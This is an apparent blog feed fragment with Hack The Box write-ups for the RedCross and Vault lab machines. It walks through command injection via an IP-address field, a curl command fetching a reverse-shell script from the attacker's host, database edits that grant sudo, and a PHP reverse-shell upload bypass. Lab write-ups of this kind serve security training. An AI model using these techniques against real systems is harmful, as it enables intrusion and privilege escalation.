&lt;img src=&quot;/images/hackthebox/redcross/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-login-with-ssh-again-&quot;&gt;Let’s login with ssh again :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-checking-our-gid-&quot;&gt;by checking our &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-root--we-still-cant-read-the-flags-&quot;&gt;It’s &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; , we still can’t read the flags :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-cant-also-sudo-&quot;&gt;We can’t also &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;weird--i-checked-etcsudoers-and-saw-this-line-&quot;&gt;Weird , I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; and saw this line :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;if-we-got-the-gid-of-the-group-sudo--we-will-be-able-to-run-sudo&quot;&gt;If we got the &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; of the group &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; , we will be able to run sudo.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat /etc/group | grep sudo&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/redcross/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-gid-is-27--lets-return-to-the-database-and-change-our-gid-from-0-to-27-&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;27&lt;/code&gt; , let’s return to the database and change our &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;27&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;update passwd_table set gid=27 where gid=0;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/redcross/55.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;select * from passwd_table;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/redcross/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great--lets-terminate-our-ssh-connection-and-login-again-we-are-now-a-member-of-sudo-and-we-can-run-sudo--so-sudo-su-will-give-us-a-root-shell&quot;&gt;Great , let’s terminate our ssh connection and login again. We are now a member of &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; and we can run &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; , so &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; will give us a root shell.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-read-the-user-flag-&quot;&gt;Let’s read the user flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;before-reading-the-root-flag-lets-see-how-can-we-actually-get-a-user-shell-as-penelope&quot;&gt;Before reading the root flag let’s see how can we actually get a user shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;penelope&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;vulnerable-smtp-server-haraka&quot;&gt;Vulnerable SMTP Server (Haraka)&lt;/h3&gt;
&lt;h4 id=&quot;back-to-the-admin-panel--after-whitelisting-the-ip-and-doing-a-second-nmap-scan-&quot;&gt;Back to the admin panel , after whitelisting the ip and doing a second nmap scan :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/59.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/redcross/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;port-1025-was-open-and-nmap-couldnt-identify-it-i-tried-several-ways-to-connect-to-that-port-nc--telnet--ftp-etc&quot;&gt;Port 1025 was open and nmap couldn’t identify it. I tried several ways to connect to that port, &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;telnet&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; etc…&lt;/h4&gt;
&lt;h4 id=&quot;fortunately-ftp-gave-me-this-banner-&quot;&gt;Fortunately &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; gave me this banner :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;that-version-of-the-smtp-server-is-vulnerable-to-a-command-injection-and-theres-a-metasploit-module-for-it-&quot;&gt;That version of the &lt;code class=&quot;highlighter-rouge&quot;&gt;SMTP&lt;/code&gt; server is vulnerable to a command injection and there’s a metasploit module for it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/62.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/redcross/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-how-to-get-a-shell-on-the-box-without-the-rce-in-the-web-application&quot;&gt;That’s how to get a shell on the box without the RCE in the web application.&lt;/h4&gt;
&lt;h4 id=&quot;we-can-get-a-shell-by-typing-shell--and-we-are-penelope-so-we-can-read-the-user-flag-&quot;&gt;We can get a shell by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; , and we are &lt;code class=&quot;highlighter-rouge&quot;&gt;penelope&lt;/code&gt; so we can read the user flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-that-we-will-do-the-same-thing-we-did-with-the-database-and-users-we-already-did-it-so-we-wont-do-it-again-back-to-our-ssh-connection-lets-read-the-root-flag-&quot;&gt;After that we will do the same thing we did with the database and users. We already did it so we won’t do it again. Back to our ssh connection let’s read the root flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/redcross/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---vault&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/vault/&quot;&gt;Hack The Box - Vault&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---teacher&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/teacher/&quot;&gt;Hack The Box - Teacher&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><summary type="html">Quick Summary Hey guys today RedCross retired and here is my write-up about it. To get an initial shell on this box there are two ways , first one is to exploit an authenticated RCE which gives you a shell as www-data , then escalate to root. The second way is to exploit a vulnerable smtp server called Haraka to get a shell as user then escalate to root. Both of the ways were fun and I liked this box. It’s a medium-rated linux box and its ip is 10.10.10.113 I added it to /etc/hosts as redcross.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC redcross.htb Port 22 is open and running ssh , there’s http and https on ports 80 and 443. As always we will check http. HTTP Initial Enumeration By going to http://redcross.htb it redirects us to https://intra.redcross.htb I added intra.redcross.htb to /etc/hosts next to the ip of the box which is 10.10.10.113 Let’s go to intra.redcross.htb again : Before doing anything I wanted to see if there are any other subdomains , so I used wfuzz with subdomains-top1mil-5000.txt from seclists : wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST:FUZZ.redcross.htb&quot; https://redcross.htb Responses for non-existing subdomains are 28 words so I stopped the scan to add --hw 28 to filter these responses : wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST:FUZZ.redcross.htb&quot; https://redcross.htb And we got admin.redcross.htb , So I added it to /etc/hosts : Note : to enumerate every subdoamin there has to be an entry for that subdomain in /etc/hosts that points to the ip of the box , that’s why I added the HOST HTTP header (-H &quot;HOST:FUZZ.redcross.htb&quot;) , it solves the problem. Now let’s go to admin.redcross.htb and see what’s there : It asks for login , we will get into this later but let’s go back to intra.redcross.htb and see what can we do from there. We need to login , I tried to bruteforce the login with wfuzz , so I intercepted the request with burp to see the parameters : Then I used wfuzz like we did before (I filtered responses with 32 chars). I used a small list for common credentials like admin:admin, top-usernames-shortlist.txt from seclists. wfuzz -c --hh 11 -u &quot;https://intra.redcross.htb/pages/actions.php&quot; -X POST -d &quot;user=FUZZ&amp;amp;pass=FUZZ&amp;amp;action=login&quot; -w top-usernames-shortlist.txt guest:guest gave us a different response. Let’s try it : And it worked. And we see this message : From: admin (uid 1) To: guest (uid 5) You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence. Broken Session Management , Admin Panel After some enumeration I found that after being authenticated as guest on intra.redcross.htb you can use the session id on admin.redcross.htb and it will work : Now we have access to the admin panel , there are two areas : User Management and Network Access User Management : Can we really add users ? Let’s try test : Nice it gave us the credentials , let’s try ssh : And it worked , but it seems like we are not on the actual host , we are in a container or a jail , let’s look at /home : interface_data and public ? Last thing I checked was /etc/passwd to know any possible user : There’s a user called penelope , but no /home directory for penelope. So I gave up on this and looked at Network Access : I added my ip address to the whitelist: Then I scanned the box with nmap again to see if some new ports show up : there’s ftp on port 21 (anonymous login not allowed), postgresql SQL database on port 5432 and a service on port 1025 but nmap couldn’t really identify it. Now there are two ways to continue , I will show the RCE first. RCE on admin.redcross.htb , Reverse Shell as www-data On the Network Access Section you can add and remove ips from the whitelist , I added a random ip , let’s say 11.11.11.11 and intercepted the two requests with burp : Allow request : Response : Deny request : Response : We notice that it’s saying Executing iptables , so the ip we provide will be a part of a system command. I added |ls to the ip parameter in the deny request and got this response : Nice we have an RCE , let’s get a reverse shell , I created a reverse shell and called it shell.sh : Then I hosted it on a python simple HTTP server , and downloaded it on the box : curl http://10.10.xx.xx/shell.sh &amp;gt; /tmp/shell.sh Python Server : Let’s verify that the shell is on the box : Nice let’s execute : bash /tmp/shell.sh We got a shell as www-data : And we see in /home a directory for penelope , but we can’t read the user flag. Hardcoded PostgreSQL Database Credentials , Privilege Escalation to root In the root directory of the web application , there’s an interseting php file called actions.php. Interesting because it handled everything , we saw it earlier in all the POST requests. I looked into it and found credentials for a db user called unixusrmgr : if($action==='del'){ header('refresh:1;url=/?page=users'); $uid=$_POST['uid']; $dbconn = pg_connect(&quot;host=10.10.10.113 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;amp;&quot;); $result = pg_prepare($dbconn, &quot;q1&quot;, &quot;delete from passwd_table where uid = $1&quot;); $result = pg_execute($dbconn, &quot;q1&quot;, array($uid)); echo &quot;User account deleted&quot;; } We knew earlier that the database is PostgreSQL , let’s connect : Some Cheatcheets for PostgreSQL : Github postgresqltutorial.com psql -h 127.0.0.1 -d unix -U unixusrmgr \dt to list the tables : I did select * from passwd_table; and got some users with their password hashes and other info , so I went back to the admin panel and added a user called rick : Then I did select * from passwd_table; again : We notice that the homedir is set to /var/jail/home that’s why we can’t access the actual host with created users. Also the gid is set to 1001. Let’s set that to 0 (root) : update passwd_table set gid=0 where gid=1001; Now the gid is 0 : Let’s also change the homedir : update passwd_table set homedir='/home' where homedir='/var/jail/home'; Let’s login with ssh again : by checking our gid : It’s root , we still can’t read the flags : We can’t also sudo : Weird , I checked /etc/sudoers and saw this line : If we got the gid of the group sudo , we will be able to run sudo. cat /etc/group | grep sudo The gid is 27 , let’s return to the database and change our gid from 0 to 27 : update passwd_table set gid=27 where gid=0; select * from passwd_table; Great , let’s terminate our ssh connection and login again. We are now a member of sudo and we can run sudo , so sudo su will give us a root shell. Let’s read the user flag : Before reading the root flag let’s see how can we actually get a user shell as penelope Vulnerable SMTP Server (Haraka) Back to the admin panel , after whitelisting the ip and doing a second nmap scan : Port 1025 was open and nmap couldn’t identify it. I tried several ways to connect to that port, nc , telnet , ftp etc… Fortunately ftp gave me this banner : That version of the SMTP server is vulnerable to a command injection and there’s a metasploit module for it : That’s how to get a shell on the box without the RCE in the web application. We can get a shell by typing shell , and we are penelope so we can read the user flag : After that we will do the same thing we did with the database and users. We already did it so we won’t do it again. Back to our ssh connection let’s read the root flag : And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Vault Next Hack The Box write-up : Hack The Box - Teacher</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/redcross/0.png" /></entry><entry><title type="html">Hack The Box - Vault</title><link href="http://localhost:4000/hack-the-box/vault/" rel="alternate" type="text/html" title="Hack The Box - Vault" /><published>2019-04-06T00:00:00+02:00</published><updated>2019-04-06T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/vault</id><content type="html" xml:base="http://localhost:4000/hack-the-box/vault/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-vault-retired-and-here-is-my-write-up-about-it-vault-was-a-fun-box-and-its-absolutely-one-of-my-favorites-starting-with-an-insecure-file-upload-functionality-to-escaping-from-a-host-to-another-and-getting-a-reverse-shell-with-an-openvpn-config--every-step-was-very-nice-its-rated-as-medium--its-a-linux-box-and-its-ip-is-101010109-i-added-it-to-etchosts-as-vaulthtb-lets-jump-right-in-&quot;&gt;Hey guys today Vault retired and here is my write-up about it. Vault was a fun box and it’s absolutely one of my favorites. Starting with an insecure file upload functionality to escaping from a host to another and getting a reverse shell with an &lt;code class=&quot;highlighter-rouge&quot;&gt;openvpn&lt;/code&gt; config , Every step was very nice. It’s rated as medium , it’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.109&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;vault.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC vault.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/vault/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;only-two-ports-are-open--80-running-http-and-22-running-ssh-as-always-we-will-check-http&quot;&gt;Only two ports are open : 80 running http and 22 running ssh. As always we will check http.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;the-main-page-is-just-displaying-this-message-&quot;&gt;The main page is just displaying this message :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Welcome to the Slowdaddy web interface

We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.

We are proud to announce our first client: Sparklays (Sparklays.com still under construction)	

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-ran-gobuster-but-didnt-get-anything--so-i-looked-at-the-message-again-and-noticed-this-line--we-are-proud-to-announce-our-first-client-sparklays-sparklayscom-still-under-construction-so-i-went-to-sparklays-and-got-a-403-response&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; but didn’t get anything , so I looked at the message again and noticed this line : &lt;code class=&quot;highlighter-rouge&quot;&gt;We are proud to announce our first client: Sparklays (Sparklays.com still under construction)&lt;/code&gt;. So I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/sparklays&lt;/code&gt; and got a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; response.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-now-we-know-that-this-directory-exists-and-we-can-enumerate-the-sub-directories-of-it--so-i-ran-gobuster-again-and-got-these-results-&quot;&gt;So now we know that this directory exists and we can enumerate the sub directories of it , so I ran gobuster again and got these results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://vault.htb/sparklays/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/05 14:55:32 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin.php (Status: 200)
/design (Status: 301)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;adminphp-sounds-interesting-but-in-fact-its-useless&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin.php&lt;/code&gt; sounds interesting. But in fact it’s useless.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/admin.php&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/vault/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-asks-for-authentication--i-tried-testtest-and-got-nothing-it-didnt-print-anything-&quot;&gt;It asks for authentication , I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;test:test&lt;/code&gt; and got nothing. It didn’t print anything :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-i-also-noticed-that-its-sending-the-login-data-through-get-parameters-which-is-rarely-used-also-checked-the-source-of-the-page-and-there-was-nothing-important-so-most-likely-this-is-just-a-rabbit-hole-and-trying-to-bypass-this-login-is-a-waste-of-time&quot;&gt;And I also noticed that it’s sending the login data through &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt; parameters which is rarely used. Also checked the source of the page and there was nothing important so most likely this is just a rabbit hole and trying to bypass this login is a waste of time.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/design&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/vault/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;design-gave-us-a-403-response--i-ran-gobuster-one-more-time-and-got-these-results-&quot;&gt;Design gave us a &lt;code class=&quot;highlighter-rouge&quot;&gt;403&lt;/code&gt; response , I ran gobuster one more time and got these results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://vault.htb/sparklays/design/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/05 15:03:20 Starting gobuster
=====================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/uploads (Status: 301)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-i-checked-uploads-&quot;&gt;So I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/uploads&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-it-was-also-forbidden-but-since-there-is-a-directory-for-uploads-then-there-might-be-a-page-for-uploading-files-lying-around-somewhere-i-ran-gobuster-again-and-added-the-extensions-php-and-html-and-got-a-new-result--designhtml&quot;&gt;And it was also forbidden. But since there is a directory for uploads then there might be a page for uploading files lying around somewhere. I ran gobuster again and added the extensions &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;html&lt;/code&gt; and got a new result : &lt;code class=&quot;highlighter-rouge&quot;&gt;design.html&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/design.html&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/vault/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-a-link-titled-change-logo-which-takes-us-to-this-upload-page-&quot;&gt;There’s a link titled &lt;code class=&quot;highlighter-rouge&quot;&gt;Change Logo&lt;/code&gt; which takes us to this upload page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;bypassing-restricted-file-upload&quot;&gt;Bypassing Restricted File Upload&lt;/h3&gt;
&lt;h4 id=&quot;i-created-a-small-php-script-to-get-a-reverse-shell-&quot;&gt;I created a small &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; script to get a reverse shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-named-it-shellphp&quot;&gt;And named it &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.php&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;tried-to-upload-and-as-expected--it-told-us-that-this-file-type-is-not-allowed-&quot;&gt;Tried to upload and as expected , it told us that this file type is not allowed :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-need-to-know-what-are-the-allowed-file-types--we-will-use-zaps-fuzzer-and-a-file-extenstions-wordlist-i-got-from-seclists&quot;&gt;We need to know what are the allowed file types , We will use Zap’s fuzzer and a &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt&quot;&gt;file extenstions wordlist&lt;/a&gt; I got from seclists.&lt;/h4&gt;
&lt;h4 id=&quot;intercept-the-request--right-click--attack--fuzzer&quot;&gt;Intercept the request –&amp;gt; right click –&amp;gt; attack –&amp;gt; Fuzzer&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/12.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/13.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-filtering-the-response-body-size-we-will-notice-that-all-the-responses-are-519-bytes-except-the-response-of-php5-which-is-526-bytes-so-it-allows-files-with-extension-php5-to-be-uploaded&quot;&gt;By filtering the response body size we will notice that all the responses are &lt;code class=&quot;highlighter-rouge&quot;&gt;519&lt;/code&gt; bytes except the response of &lt;code class=&quot;highlighter-rouge&quot;&gt;.php5&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;526&lt;/code&gt; bytes. So it allows files with extension &lt;code class=&quot;highlighter-rouge&quot;&gt;.php5&lt;/code&gt; to be uploaded.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;since-the-request-has-already-been-sent-then-the-php-shell-is-on-the-server-now--lets-excute-it-&quot;&gt;Since the request has already been sent then the php shell is on the server now , Let’s excute it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-are-two-users-on-the-box-alex-and-dave--user-flag-is-not-on-the-box-on-the-desktop-of-dave-there-is-a-file-called-ssh-which-has-ssh-credentials-&quot;&gt;There are two users on the box &lt;code class=&quot;highlighter-rouge&quot;&gt;alex&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; , user flag is not on the box. On the desktop of &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; there is a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; which has ssh credentials :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/18.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/vault/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-get-an-ssh-connection-as-dave-instead-of-this-reverse-shell-as-www-data-dave--dav3therav3123-&quot;&gt;Now we can get an ssh connection as &lt;code class=&quot;highlighter-rouge&quot;&gt;dave&lt;/code&gt; instead of this reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;dave : Dav3therav3123&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;escaping-from-ubuntu-to-dns--openvpn-reverse-shell--getting-user&quot;&gt;Escaping from &lt;code class=&quot;highlighter-rouge&quot;&gt;ubuntu&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;DNS&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;openvpn&lt;/code&gt; reverse shell , Getting user&lt;/h3&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-rest-of-the-files-on-daves-desktop-&quot;&gt;Let’s take a look at the rest of the files on dave’s desktop :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/vault/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
